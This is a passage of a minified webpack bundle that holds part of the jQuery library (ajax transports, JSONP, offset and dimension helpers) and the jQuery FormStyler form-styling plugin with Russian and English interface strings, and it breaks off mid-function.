                        }(g, a, k, o), o ? (g.ifModified && ((l = k.getResponseHeader("Last-Modified")) && (C.lastModified[u] = l), (l = k.getResponseHeader("etag")) && (C.etag[u] = l)), 204 === e || "HEAD" === g.type ? d = "nocontent" : 304 === e ? d = "notmodified" : (d = a.state, s = a.data, o = !(r = a.error))) : (r = d, !e && d || (d = "error", e < 0 && (e = 0))), k.status = e, k.statusText = (t || d) + "", o ? b.resolveWith(m, [s, d, k]) : b.rejectWith(m, [k, d, r]), k.statusCode(x), x = void 0, v && y.trigger(o ? "ajaxSuccess" : "ajaxError", [k, g, o ? s : r]), w.fireWith(m, [k, d]), v && (y.trigger("ajaxComplete", [k, g]), --C.active || C.event.trigger("ajaxStop")))
                    }
                    return k
                },
                getJSON: function(e, t, i) {
                    return C.get(e, t, i, "json")
                },
                getScript: function(e, t) {
                    return C.get(e, void 0, t, "script")
                }
            }), C.each(["get", "post"], function(e, o) {
                C[o] = function(e, t, i, n) {
                    return y(t) && (n = n || i, i = t, t = void 0), C.ajax(C.extend({
                        url: e,
                        type: o,
                        dataType: n,
                        data: t,
                        success: i
                    }, C.isPlainObject(e) && e))
                }
            }), C._evalUrl = function(e) {
                return C.ajax({
                    url: e,
                    type: "GET",
                    dataType: "script",
                    cache: !0,
                    async: !1,
                    global: !1,
                    throws: !0
                })
            }, C.fn.extend({
                wrapAll: function(e) {
                    var t;
                    return this[0] && (y(e) && (e = e.call(this[0])), t = C(e, this[0].ownerDocument).eq(0).clone(!0), this[0].parentNode && t.insertBefore(this[0]), t.map(function() {
                        for (var e = this; e.firstElementChild;) e = e.firstElementChild;
                        return e
                    }).append(this)), this
                },
                wrapInner: function(i) {
                    return y(i) ? this.each(function(e) {
                        C(this).wrapInner(i.call(this, e))
                    }) : this.each(function() {
                        var e = C(this),
                            t = e.contents();
                        t.length ? t.wrapAll(i) : e.append(i)
                    })
                },
                wrap: function(t) {
                    var i = y(t);
                    return this.each(function(e) {
                        C(this).wrapAll(i ? t.call(this, e) : t)
                    })
                },
                unwrap: function(e) {
                    return this.parent(e).not("body").each(function() {
                        C(this).replaceWith(this.childNodes)
                    }), this
                }
            }), C.expr.pseudos.hidden = function(e) {
                return !C.expr.pseudos.visible(e)
            }, C.expr.pseudos.visible = function(e) {
                return !!(e.offsetWidth || e.offsetHeight || e.getClientRects().length)
            }, C.ajaxSettings.xhr = function() {
                try {
                    return new S.XMLHttpRequest
                } catch (e) {}
            };
            var Wt = {
                    0: 200,
                    1223: 204
                },
                zt = C.ajaxSettings.xhr();
            m.cors = !!zt && "withCredentials" in zt, m.ajax = zt = !!zt, C.ajaxTransport(function(o) {
                var s, r;
                if (m.cors || zt && !o.crossDomain) return {
                    send: function(e, t) {
                        var i, n = o.xhr();
                        if (n.open(o.type, o.url, o.async, o.username, o.password), o.xhrFields)
                            for (i in o.xhrFields) n[i] = o.xhrFields[i];
                        for (i in o.mimeType && n.overrideMimeType && n.overrideMimeType(o.mimeType), o.crossDomain || e["X-Requested-With"] || (e["X-Requested-With"] = "XMLHttpRequest"), e) n.setRequestHeader(i, e[i]);
                        s = function(e) {
                            return function() {
                                s && (s = r = n.onload = n.onerror = n.onabort = n.ontimeout = n.onreadystatechange = null, "abort" === e ? n.abort() : "error" === e ? "number" != typeof n.status ? t(0, "error") : t(n.status, n.statusText) : t(Wt[n.status] || n.status, n.statusText, "text" !== (n.responseType || "text") || "string" != typeof n.responseText ? {
                                    binary: n.response
                                } : {
                                    text: n.responseText
                                }, n.getAllResponseHeaders()))
                            }
                        }, n.onload = s(), r = n.onerror = n.ontimeout = s("error"), void 0 !== n.onabort ? n.onabort = r : n.onreadystatechange = function() {
                            4 === n.readyState && S.setTimeout(function() {
                                s && r()
                            })
                        }, s = s("abort");
                        try {
                            n.send(o.hasContent && o.data || null)
                        } catch (e) {
                            if (s) throw e
                        }
                    },
                    abort: function() {
                        s && s()
                    }
                }
            }), C.ajaxPrefilter(function(e) {
                e.crossDomain && (e.contents.script = !1)
            }), C.ajaxSetup({
                accepts: {
                    script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"
                },
                contents: {
                    script: /\b(?:java|ecma)script\b/
                },
                converters: {
                    "text script": function(e) {
                        return C.globalEval(e), e
                    }
                }
            }), C.ajaxPrefilter("script", function(e) {
                void 0 === e.cache && (e.cache = !1), e.crossDomain && (e.type = "GET")
            }), C.ajaxTransport("script", function(i) {
                var n, o;
                if (i.crossDomain) return {
                    send: function(e, t) {
                        n = C("<script>").prop({
                            charset: i.scriptCharset,
                            src: i.url
                        }).on("load error", o = function(e) {
                            n.remove(), o = null, e && t("error" === e.type ? 404 : 200, e.type)
                        }), T.head.appendChild(n[0])
                    },
                    abort: function() {
                        o && o()
                    }
                }
            });
            var Rt, Ft = [],
                Bt = /(=)\?(?=&|$)|\?\?/;
            C.ajaxSetup({
                jsonp: "callback",
                jsonpCallback: function() {
                    var e = Ft.pop() || C.expando + "_" + wt++;
                    return this[e] = !0, e
                }
            }), C.ajaxPrefilter("json jsonp", function(e, t, i) {
                var n, o, s, r = !1 !== e.jsonp && (Bt.test(e.url) ? "url" : "string" == typeof e.data && 0 === (e.contentType || "").indexOf("application/x-www-form-urlencoded") && Bt.test(e.data) && "data");
                if (r || "jsonp" === e.dataTypes[0]) return n = e.jsonpCallback = y(e.jsonpCallback) ? e.jsonpCallback() : e.jsonpCallback, r ? e[r] = e[r].replace(Bt, "$1" + n) : !1 !== e.jsonp && (e.url += (xt.test(e.url) ? "&" : "?") + e.jsonp + "=" + n), e.converters["script json"] = function() {
                    return s || C.error(n + " was not called"), s[0]
                }, e.dataTypes[0] = "json", o = S[n], S[n] = function() {
                    s = arguments
                }, i.always(function() {
                    void 0 === o ? C(S).removeProp(n) : S[n] = o, e[n] && (e.jsonpCallback = t.jsonpCallback, Ft.push(n)), s && y(o) && o(s[0]), s = o = void 0
                }), "script"
            }), m.createHTMLDocument = ((Rt = T.implementation.createHTMLDocument("").body).innerHTML = "<form></form><form></form>", 2 === Rt.childNodes.length), C.parseHTML = function(e, t, i) {
                return "string" != typeof e ? [] : ("boolean" == typeof t && (i = t, t = !1), t || (m.createHTMLDocument ? ((n = (t = T.implementation.createHTMLDocument("")).createElement("base")).href = T.location.href, t.head.appendChild(n)) : t = T), s = !i && [], (o = j.exec(e)) ? [t.createElement(o[1])] : (o = me([e], t, s), s && s.length && C(s).remove(), C.merge([], o.childNodes)));
                var n, o, s
            }, C.fn.load = function(e, t, i) {
                var n, o, s, r = this,
                    a = e.indexOf(" ");
                return -1 < a && (n = ft(e.slice(a)), e = e.slice(0, a)), y(t) ? (i = t, t = void 0) : t && "object" == (void 0 === t ? "undefined" : Vt(t)) && (o = "POST"), 0 < r.length && C.ajax({
                    url: e,
                    type: o || "GET",
                    dataType: "html",
                    data: t
                }).done(function(e) {
                    s = arguments, r.html(n ? C("<div>").append(C.parseHTML(e)).find(n) : e)
                }).always(i && function(e, t) {
                    r.each(function() {
                        i.apply(this, s || [e.responseText, t, e])
                    })
                }), this
            }, C.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], function(e, t) {
                C.fn[t] = function(e) {
                    return this.on(t, e)
                }
            }), C.expr.pseudos.animated = function(t) {
                return C.grep(C.timers, function(e) {
                    return t === e.elem
                }).length
            }, C.offset = {
                setOffset: function(e, t, i) {
                    var n, o, s, r, a, l, d = C.css(e, "position"),
                        c = C(e),
                        u = {};
                    "static" === d && (e.style.position = "relative"), a = c.offset(), s = C.css(e, "top"), l = C.css(e, "left"), o = ("absolute" === d || "fixed" === d) && -1 < (s + l).indexOf("auto") ? (r = (n = c.position()).top, n.left) : (r = parseFloat(s) || 0, parseFloat(l) || 0), y(t) && (t = t.call(e, i, C.extend({}, a))), null != t.top && (u.top = t.top - a.top + r), null != t.left && (u.left = t.left - a.left + o), "using" in t ? t.using.call(e, u) : c.css(u)
                }
            }, C.fn.extend({
                offset: function(t) {
                    if (arguments.length) return void 0 === t ? this : this.each(function(e) {
                        C.offset.setOffset(this, t, e)
                    });
                    var e, i, n = this[0];
                    return n ? n.getClientRects().length ? (e = n.getBoundingClientRect(), i = n.ownerDocument.defaultView, {
                        top: e.top + i.pageYOffset,
                        left: e.left + i.pageXOffset
                    }) : {
                        top: 0,
                        left: 0
                    } : void 0
                },
                position: function() {
                    if (this[0]) {
                        var e, t, i, n = this[0],
                            o = {
                                top: 0,
                                left: 0
                            };
                        if ("fixed" === C.css(n, "position")) t = n.getBoundingClientRect();
                        else {
                            for (t = this.offset(), i = n.ownerDocument, e = n.offsetParent || i.documentElement; e && (e === i.body || e === i.documentElement) && "static" === C.css(e, "position");) e = e.parentNode;
                            e && e !== n && 1 === e.nodeType && ((o = C(e).offset()).top += C.css(e, "borderTopWidth", !0), o.left += C.css(e, "borderLeftWidth", !0))
                        }
                        return {
                            top: t.top - o.top - C.css(n, "marginTop", !0),
                            left: t.left - o.left - C.css(n, "marginLeft", !0)
                        }
                    }
                },
                offsetParent: function() {
                    return this.map(function() {
                        for (var e = this.offsetParent; e && "static" === C.css(e, "position");) e = e.offsetParent;
                        return e || ye
                    })
                }
            }), C.each({
                scrollLeft: "pageXOffset",
                scrollTop: "pageYOffset"
            }, function(t, o) {
                var s = "pageYOffset" === o;
                C.fn[t] = function(e) {
                    return R(this, function(e, t, i) {
                        var n;
                        if (b(e) ? n = e : 9 === e.nodeType && (n = e.defaultView), void 0 === i) return n ? n[o] : e[t];
                        n ? n.scrollTo(s ? n.pageXOffset : i, s ? i : n.pageYOffset) : e[t] = i
                    }, t, e, arguments.length)
                }
            }), C.each(["top", "left"], function(e, i) {
                C.cssHooks[i] = We(m.pixelPosition, function(e, t) {
                    if (t) return t = Ie(e, i), Oe.test(t) ? C(e).position()[i] + "px" : t
                })
            }), C.each({
                Height: "height",
                Width: "width"
            }, function(r, a) {
                C.each({
                    padding: "inner" + r,
                    content: a,
                    "": "outer" + r
                }, function(n, s) {
                    C.fn[s] = function(e, t) {
                        var i = arguments.length && (n || "boolean" != typeof e),
                            o = n || (!0 === e || !0 === t ? "margin" : "border");
                        return R(this, function(e, t, i) {
                            var n;
                            return b(e) ? 0 === s.indexOf("outer") ? e["inner" + r] : e.document.documentElement["client" + r] : 9 === e.nodeType ? (n = e.documentElement, Math.max(e.body["scroll" + r], n["scroll" + r], e.body["offset" + r], n["offset" + r], n["client" + r])) : void 0 === i ? C.css(e, t, o) : C.style(e, t, i, o)
                        }, a, i ? e : void 0, i)
                    }
                })
            }), C.each("blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(" "), function(e, i) {
                C.fn[i] = function(e, t) {
                    return 0 < arguments.length ? this.on(i, null, e, t) : this.trigger(i)
                }
            }), C.fn.extend({
                hover: function(e, t) {
                    return this.mouseenter(e).mouseleave(t || e)
                }
            }), C.fn.extend({
                bind: function(e, t, i) {
                    return this.on(e, null, t, i)
                },
                unbind: function(e, t) {
                    return this.off(e, null, t)
                },
                delegate: function(e, t, i, n) {
                    return this.on(t, e, i, n)
                },
                undelegate: function(e, t, i) {
                    return 1 === arguments.length ? this.off(e, "**") : this.off(t, e || "**", i)
                }
            }), C.proxy = function(e, t) {
                var i, n, o;
                if ("string" == typeof t && (i = e[t], t = e, e = i), y(e)) return n = a.call(arguments, 2), (o = function() {
                    return e.apply(t || this, n.concat(a.call(arguments)))
                }).guid = e.guid = e.guid || C.guid++, o
            }, C.holdReady = function(e) {
                e ? C.readyWait++ : C.ready(!0)
            }, C.isArray = Array.isArray, C.parseJSON = JSON.parse, C.nodeName = A, C.isFunction = y, C.isWindow = b, C.camelCase = U, C.type = x, C.now = Date.now, C.isNumeric = function(e) {
                var t = C.type(e);
                return ("number" === t || "string" === t) && !isNaN(e - parseFloat(e))
            }, void 0 === (Yt = function() {
                return C
            }.apply(Kt, [])) || (Gt.exports = Yt);
            var Xt = S.jQuery,
                Ut = S.$;
            return C.noConflict = function(e) {
                return S.$ === C && (S.$ = Ut), e && S.jQuery === C && (S.jQuery = Xt), C
            }, e || (S.jQuery = S.$ = C), C
        }, "object" == Vt(Gt) && "object" == Vt(Gt.exports) ? Gt.exports = e.document ? t(e, !0) : function(e) {
            if (!e.document) throw new Error("jQuery requires a window with a document");
            return t(e)
        } : t(e)
    }).call(this, t(3)(e))
}, function(e, t) {
    e.exports = function(e) {
        return e.webpackPolyfill || (e.deprecate = function() {}, e.paths = [], e.children || (e.children = []), Object.defineProperty(e, "loaded", {
            enumerable: !0,
            get: function() {
                return e.l
            }
        }), Object.defineProperty(e, "id", {
            enumerable: !0,
            get: function() {
                return e.i
            }
        }), e.webpackPolyfill = 1), e
    }
}, function(e, t, i) {
    "use strict";
    var n, o, s, r = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
        return typeof e
    } : function(e) {
        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
    };
    o = [i(0)], void 0 === (s = "function" == typeof(n = function(O) {
        function o(e, t) {
            this.element = e, this.options = O.extend({}, n, t);
            var i = this.options.locale;
            void 0 !== this.options.locales[i] && O.extend(this.options, this.options.locales[i]), this.init()
        }

        function L(e) {
            if (!O(e.target).parents().hasClass("jq-selectbox") && "OPTION" != e.target.nodeName && O("div.jq-selectbox.opened").length) {
                var t = O("div.jq-selectbox.opened"),
                    i = O("div.jq-selectbox__search input", t),
                    n = O("div.jq-selectbox__dropdown", t);
                t.find("select").data("_" + s).options.onSelectClosed.call(t), i.length && i.val("").keyup(), n.hide().find("li.sel").addClass("selected"), t.removeClass("focused opened dropup dropdown")
            }
        }
        var s = "styler",
            n = {
                idSuffix: "-styler",
                filePlaceholder: "Файл не выбран",
                fileBrowse: "Обзор...",
                fileNumber: "Выбрано файлов: %s",
                selectPlaceholder: "Выберите...",
                selectSearch: !1,
                selectSearchLimit: 10,
                selectSearchNotFound: "Совпадений не найдено",
                selectSearchPlaceholder: "Поиск...",
                selectVisibleOptions: 0,
                selectSmartPositioning: !1,
                locale: "ru",
                locales: {
                    en: {
                        filePlaceholder: "No file selected",
                        fileBrowse: "Browse...",
                        fileNumber: "Selected files: %s",
                        selectPlaceholder: "Select...",
                        selectSearchNotFound: "No matches found",
                        selectSearchPlaceholder: "Search..."
                    }
                },
                onSelectOpened: function() {},
                onSelectClosed: function() {},
                onFormStyled: function() {}
            };
        o.prototype = {
            init: function() {
                function D() {
                    void 0 !== q.attr("id") && "" !== q.attr("id") && (this.id = q.attr("id") + H.idSuffix), this.title = q.attr("title"), this.classes = q.attr("class"), this.data = q.data()
                }
                var q = O(this.element),
                    H = this.options,
                    N = !(!navigator.userAgent.match(/(iPad|iPhone|iPod)/i) || navigator.userAgent.match(/(Windows\sPhone)/i)),
                    e = !(!navigator.userAgent.match(/Android/i) || navigator.userAgent.match(/(Windows\sPhone)/i));
                if (q.is(":checkbox")) {
                    var t = function() {
                        var e = new D,
                            t = O('<div class="jq-checkbox"><div class="jq-checkbox__div"></div></div>').attr({
                                id: e.id,
                                title: e.title
                            }).addClass(e.classes).data(e.data);
                        q.after(t).prependTo(t), q.is(":checked") && t.addClass("checked"), q.is(":disabled") && t.addClass("disabled"), t.click(function(e) {
                            e.preventDefault(), q.triggerHandler("click"), t.is(".disabled") || (q.is(":checked") ? (q.prop("checked", !1), t.removeClass("checked")) : (q.prop("checked", !0), t.addClass("checked")), q.focus().change())
                        }), q.closest("label").add('label[for="' + q.attr("id") + '"]').on("click.styler", function(e) {
                            O(e.target).is("a") || O(e.target).closest(t).length || (t.triggerHandler("click"), e.preventDefault())
                        }), q.on("change.styler", function() {
                            q.is(":checked") ? t.addClass("checked") : t.removeClass("checked")
                        }).on("keydown.styler", function(e) {
                            32 == e.which && t.click()
                        }).on("focus.styler", function() {
                            t.is(".disabled") || t.addClass("focused")
                        }).on("blur.styler", function() {
                            t.removeClass("focused")
                        })
                    };
                    t(), q.on("refresh", function() {
                        q.closest("label").add('label[for="' + q.attr("id") + '"]').off(".styler"), q.off(".styler").parent().before(q).remove(), t()
                    })
                } else if (q.is(":radio")) {
                    var i = function() {
                        var e = new D,
                            i = O('<div class="jq-radio"><div class="jq-radio__div"></div></div>').attr({
                                id: e.id,
                                title: e.title
                            }).addClass(e.classes).data(e.data);
                        q.after(i).prependTo(i), q.is(":checked") && i.addClass("checked"), q.is(":disabled") && i.addClass("disabled"), O.fn.commonParents = function() {
                            var e = this;
                            return e.first().parents().filter(function() {
                                return O(this).find(e).length === e.length
                            })
                        }, O.fn.commonParent = function() {
                            return O(this).commonParents().first()
                        }, i.click(function(e) {
                            if (e.preventDefault(), q.triggerHandler("click"), !i.is(".disabled")) {
                                var t = O('input[name="' + q.attr("name") + '"]');
                                t.commonParent().find(t).prop("checked", !1).parent().removeClass("checked"), q.prop("checked", !0).parent().addClass("checked"), q.focus().change()
                            }
                        }), q.closest("label").add('label[for="' + q.attr("id") + '"]').on("click.styler", function(e) {
                            O(e.target).is("a") || O(e.target).closest(i).length || (i.triggerHandler("click"), e.preventDefault())
                        }), q.on("change.styler", function() {
                            q.parent().addClass("checked")
                        }).on("focus.styler", function() {
                            i.is(".disabled") || i.addClass("focused")
                        }).on("blur.styler", function() {
                            i.removeClass("focused")
                        })
                    };
                    i(), q.on("refresh", function() {
                        q.closest("label").add('label[for="' + q.attr("id") + '"]').off(".styler"), q.off(".styler").parent().before(q).remove(), i()
                    })
                } else if (q.is(":file")) {
                    var n = function() {
                        var e = new D,
                            n = q.data("placeholder");
                        void 0 === n && (n = H.filePlaceholder);
                        var t = q.data("browse");
                        void 0 !== t && "" !== t || (t = H.fileBrowse);
                        var o = O('<div class="jq-file"><div class="jq-file__name">' + n + '</div><div class="jq-file__browse">' + t + "</div></div>").attr({
                            id: e.id,
                            title: e.title
                        }).addClass(e.classes).data(e.data);
                        q.after(o).appendTo(o), q.is(":disabled") && o.addClass("disabled");
                        var i = q.val(),
                            s = O("div.jq-file__name", o);
                        i && s.text(i.replace(/.+[\\\/]/, "")), q.on("change.styler", function() {
                            var e = q.val();
                            if (q.is("[multiple]")) {
                                e = "";
                                var t = q[0].files.length;
                                if (0 < t) {
                                    var i = q.data("number");
                                    void 0 === i && (i = H.fileNumber), e = i = i.replace("%s", t)
                                }
                            }
                            s.text(e.replace(/.+[\\\/]/, "")), "" === e ? (s.text(n), o.removeClass("changed")) : o.addClass("changed")
                        }).on("focus.styler", function() {
                            o.addClass("focused")
                        }).on("blur.styler", function() {
                            o.removeClass("focused")
                        }).on("click.styler", function() {
                            o.removeClass("focused")
                        })
                    };
                    n(), q.on("refresh", function() {
                        q.off(".styler").parent().before(q).remove(), n()
                    })
                } else if (q.is('input[type="number"]')) {
                    var o = function() {
                        var e = new D,
                            t = O('<div class="jq-number"><div class="jq-number__spin minus"></div><div class="jq-number__spin plus"></div></div>').attr({
                                id: e.id,
                                title: e.title
                            }).addClass(e.classes).data(e.data);
                        q.after(t).prependTo(t).wrap('<div class="jq-number__field"></div>'), q.is(":disabled") && t.addClass("disabled");
                        var s, r, a, i = null,
                            n = null;
                        void 0 !== q.attr("min") && (s = q.attr("min")), void 0 !== q.attr("max") && (r = q.attr("max")), a = void 0 !== q.attr("step") && O.isNumeric(q.attr("step")) ? Number(q.attr("step")) : Number(1);
                        var o = function(e) {
                            var t, i = q.val();
                            O.isNumeric(i) || (i = 0, q.val("0")), e.is(".minus") ? t = Number(i) - a : e.is(".plus") && (t = Number(i) + a);
                            var n = (a.toString().split(".")[1] || []).length;
                            if (0 < n) {
                                for (var o = "1"; o.length <= n;) o += "0";
                                t = Math.round(t * o) / o
                            }
                            O.isNumeric(s) && O.isNumeric(r) ? s <= t && t <= r && q.val(t) : O.isNumeric(s) && !O.isNumeric(r) ? s <= t && q.val(t) : !O.isNumeric(s) && O.isNumeric(r) ? t <= r && q.val(t) : q.val(t)
                        };
                        t.is(".disabled") || (t.on("mousedown", "div.jq-number__spin", function() {
                            var e = O(this);
                            o(e), i = setTimeout(function() {
                                n = setInterval(function() {
                                    o(e)
                                }, 40)
                            }, 350)
                        }).on("mouseup mouseout", "div.jq-number__spin", function() {
                            clearTimeout(i), clearInterval(n)
                        }).on("mouseup", "div.jq-number__spin", function() {
                            q.change().trigger("input")
                        }), q.on("focus.styler", function() {
                            t.addClass("focused")
                        }).on("blur.styler", function() {
                            t.removeClass("focused")
                        }))
                    };
                    o(), q.on("refresh", function() {
                        q.off(".styler").closest(".jq-number").before(q).remove(), o()
                    })
                } else if (q.is("select")) {
                    var s = function() {
                        function j(t) {
                            var i = t.prop("scrollHeight") - t.outerHeight(),
                                n = null,
                                o = null;
                            t.off("mousewheel DOMMouseScroll").on("mousewheel DOMMouseScroll", function(e) {
                                n = e.originalEvent.detail < 0 || 0 < e.originalEvent.wheelDelta ? 1 : -1, ((o = t.scrollTop()) >= i && n < 0 || o <= 0 && 0 < n) && (e.stopPropagation(), e.preventDefault())
                            })
                        }

                        function E() {
                            for (var e = 0; e < M.length; e++) {
                                var t = M.eq(e),
                                    i = "",
                                    n = "",
                                    o = "",
                                    s = "",
                                    r = "",
                                    a = "",
                                    l = "",
                                    d = "",
                                    c = "";
                                t.prop("selected") && (n = "selected sel"), t.is(":disabled") && (n = "disabled"), t.is(":selected:disabled") && (n = "selected sel disabled"), void 0 !== t.attr("id") && "" !== t.attr("id") && (s = ' id="' + t.attr("id") + H.idSuffix + '"'), void 0 !== t.attr("title") && "" !== M.attr("title") && (r = ' title="' + t.attr("title") + '"'), void 0 !== t.attr("class") && (l = " " + t.attr("class"), c = ' data-jqfs-class="' + t.attr("class") + '"');
                                var u = t.data();
                                for (var p in u) "" !== u[p] && (a += " data-" + p + '="' + u[p] + '"');
                                n + l !== "" && (o = ' class="' + n + l + '"'), i = "<li" + c + a + o + r + s + ">" + t.html() + "</li>", t.parent().is("optgroup") && (void 0 !== t.parent().attr("class") && (d = " " + t.parent().attr("class")), i = "<li" + c + a + ' class="' + n + l + " option" + d + '"' + r + s + ">" + t.html() + "</li>", t.is(":first-child") && (i = '<li class="optgroup' + d + '">' + t.parent().attr("label") + "</li>" + i)), P += i
                            }
                        }
                        var M = O("option", q),
                            P = "";
                        if (q.is("[multiple]")) {
                            if (e || N) return;
                            ! function() {
                                var e = new D,
                                    t = O('<div class="jq-select-multiple jqselect"></div>').attr({
                                        id: e.id,
                                        title: e.title
                                    }).addClass(e.classes).data(e.data);
                                q.after(t), E(), t.append("<ul>" + P + "</ul>");
                                var i = O("ul", t),
                                    o = O("li", t),
                                    n = q.attr("size"),
                                    s = i.outerHeight(),
                                    r = o.outerHeight();
                                void 0 !== n && 0 < n ? i.css({
                                    height: r * n
                                }) : i.css({
                                    height: 4 * r
                                }), s > t.height() && (i.css("overflowY", "scroll"), j(i), o.filter(".selected").length && i.scrollTop(i.scrollTop() + o.filter(".selected").position().top)), q.prependTo(t), q.is(":disabled") ? (t.addClass("disabled"), M.each(function() {
                                    O(this).is(":selected") && o.eq(O(this).index()).addClass("selected")
                                })) : (o.filter(":not(.disabled):not(.optgroup)").click(function(e) {
                                    q.focus();
                                    var t = O(this);
                                    if (e.ctrlKey || e.metaKey || t.addClass("selected"), e.shiftKey || t.addClass("first"), e.ctrlKey || e.metaKey || e.shiftKey || t.siblings().removeClass("selected first"), (e.ctrlKey || e.metaKey) && (t.is(".selected") ? t.removeClass("selected first") : t.addClass("selected first"), t.siblings().removeClass("first")), e.shiftKey) {
                                        var i = !1,
                                            n = !1;
                                        t.siblings().removeClass("selected").siblings(".first").addClass("selected"), t.prevAll().each(function() {
                                            O(this).is(".first") && (i = !0)
                                        }), t.nextAll().each(function() {
                                            O(this).is(".first") && (n = !0)
                                        }), i && t.prevAll().each(function() {
                                            if (O(this).is(".selected")) return !1;
                                            O(this).not(".disabled, .optgroup").addClass("selected")
                                        }), n && t.nextAll().each(function() {
                                            if (O(this).is(".selected")) return !1;
                                            O(this).not(".disabled, .optgroup").addClass("selected")
                                        }), 1 == o.filter(".selected").length && t.addClass("first")
                                    }
                                    M.prop("selected", !1), o.filter(".selected").each(function() {
                                        var e = O(this),
                                            t = e.index();
                                        e.is(".option") && (t -= e.prevAll(".optgroup").length), M.eq(t).prop("selected", !0)
                                    }), q.change()
                                }), M.each(function(e) {
                                    O(this).data("optionIndex", e)
                                }), q.on("change.styler", function() {
                                    o.removeClass("selected");
                                    var t = [];
                                    M.filter(":selected").each(function() {
                                        t.push(O(this).data("optionIndex"))
                                    }), o.not(".optgroup").filter(function(e) {
                                        return -1 < O.inArray(e, t)
                                    }).addClass("selected")
                                }).on("focus.styler", function() {
                                    t.addClass("focused")
                                }).on("blur.styler", function() {
                                    t.removeClass("focused")
                                }), s > t.height() && q.on("keydown.styler", function(e) {
                                    38 != e.which && 37 != e.which && 33 != e.which || i.scrollTop(i.scrollTop() + o.filter(".selected").position().top - r), 40 != e.which && 39 != e.which && 34 != e.which || i.scrollTop(i.scrollTop() + o.filter(".selected:last").position().top - i.innerHeight() + 2 * r)
                                }))
                            }()
                        } else ! function() {
                            var e = new D,
                                t = "",
                                i = q.data("placeholder"),
                                n = q.data("search"),
                                o = q.data("search-limit"),
                                s = q.data("search-not-found"),
                                r = q.data("search-placeholder"),
                                l = q.data("smart-positioning");
                            void 0 === i && (i = H.selectPlaceholder), void 0 !== n && "" !== n || (n = H.selectSearch), void 0 !== o && "" !== o || (o = H.selectSearchLimit), void 0 !== s && "" !== s || (s = H.selectSearchNotFound), void 0 === r && (r = H.selectSearchPlaceholder), void 0 !== l && "" !== l || (l = H.selectSmartPositioning);
                            var d = O('<div class="jq-selectbox jqselect"><div class="jq-selectbox__select"><div class="jq-selectbox__select-text"></div><div class="jq-selectbox__trigger"><div class="jq-selectbox__trigger-arrow"></div></div></div></div>').attr({
                                id: e.id,
                                title: e.title
                            }).addClass(e.classes).data(e.data);
                            q.after(d).prependTo(d);
                            var c = d.css("z-index");
                            c = 0 < c ? c : 1;
                            var a = O("div.jq-selectbox__select", d),
                                u = O("div.jq-selectbox__select-text", d),
                                p = M.filter(":selected");
                            E(), n && (t = '<div class="jq-selectbox__search"><input type="search" autocomplete="off" placeholder="' + r + '"></div><div class="jq-selectbox__not-found">' + s + "</div>");
                            var f = O('<div class="jq-selectbox__dropdown">' + t + "<ul>" + P + "</ul></div>");
                            d.append(f);
                            var h = O("ul", f),
                                v = O("li", f),
                                g = O("input", f),
                                m = O("div.jq-selectbox__not-found", f).hide();
                            v.length < o && g.parent().hide(), "" === M.first().text() && M.first().is(":selected") && !1 !== i ? u.text(i).addClass("placeholder") : u.text(p.text());
                            var y = 0,
                                b = 0;
                            if (v.css({
                                    display: "inline-block"
                                }), v.each(function() {
                                    var e = O(this);
                                    e.innerWidth() > y && (y = e.innerWidth(), b = e.width())
                                }), v.css({
                                    display: ""
                                }), u.is(".placeholder") && u.width() > y) u.width(u.width());
                            else {
                                var w = d.clone().appendTo("body").width("auto"),
                                    x = w.outerWidth();
                                w.remove(), x == d.outerWidth() && u.width(b)
                            }
                            y > d.width() && f.width(y), "" === M.first().text() && "" !== q.data("placeholder") && v.first().hide();
                            var k = d.outerHeight(!0),
                                S = g.parent().outerHeight(!0) || 0,
                                T = h.css("max-height"),
                                C = v.filter(".selected");
                            if (C.length < 1 && v.first().addClass("selected sel"), void 0 === v.data("li-height")) {
                                var $ = v.outerHeight();
                                !1 !== i && ($ = v.eq(1).outerHeight()), v.data("li-height", $)
                            }
                            var A = f.css("top");
                            if ("auto" == f.css("left") && f.css({
                                    left: 0
                                }), "auto" == f.css("top") && (f.css({
                                    top: k
                                }), A = k), f.hide(), C.length && (M.first().text() != p.text() && d.addClass("changed"), d.data("jqfs-class", C.data("jqfs-class")), d.addClass(C.data("jqfs-class"))), q.is(":disabled")) return d.addClass("disabled");
                            a.click(function() {
                                if (O("div.jq-selectbox").filter(".opened").length && H.onSelectClosed.call(O("div.jq-selectbox").filter(".opened")), q.focus(), !N) {
                                    var t = O(window),
                                        i = v.data("li-height"),
                                        n = d.offset().top,
                                        o = t.height() - k - (n - t.scrollTop()),
                                        e = q.data("visible-options");
                                    void 0 !== e && "" !== e || (e = H.selectVisibleOptions);
                                    var s = 5 * i,
                                        r = i * e;
                                    0 < e && e < 6 && (s = r), 0 === e && (r = "auto");
                                    var a = function() {
                                        f.height("auto").css({
                                            bottom: "auto",
                                            top: A
                                        });
                                        var e = function() {
                                            h.css("max-height", Math.floor((o - 20 - S) / i) * i)
                                        };
                                        e(), h.css("max-height", r), "none" != T && h.css("max-height", T), o < f.outerHeight() + 20 && e()
                                    };
                                    !0 === l || 1 === l ? s + S + 20 < o ? (a(), d.removeClass("dropup").addClass("dropdown")) : (function() {
                                        f.height("auto").css({
                                            top: "auto",
                                            bottom: A
                                        });
                                        var e = function() {
                                            h.css("max-height", Math.floor((n - t.scrollTop() - 20 - S) / i) * i)
                                        };
                                        e(), h.css("max-height", r), "none" != T && h.css("max-height", T), n - t.scrollTop() - 20 < f.outerHeight() + 20 && e()
                                    }(), d.removeClass("dropdown").addClass("dropup")) : !1 === l || 0 === l ? s + S + 20 < o && (a(), d.removeClass("dropup").addClass("dropdown")) : (f.height("auto").css({
                                        bottom: "auto",
                                        top: A
                                    }), h.css("max-height", r), "none" != T && h.css("max-height", T)), d.offset().left + f.outerWidth() > t.width() && f.css({
                                        left: "auto",
                                        right: 0
                                    }), O("div.jqselect").css({
                                        zIndex: c - 1
                                    }).removeClass("opened"), d.css({
                                        zIndex: c
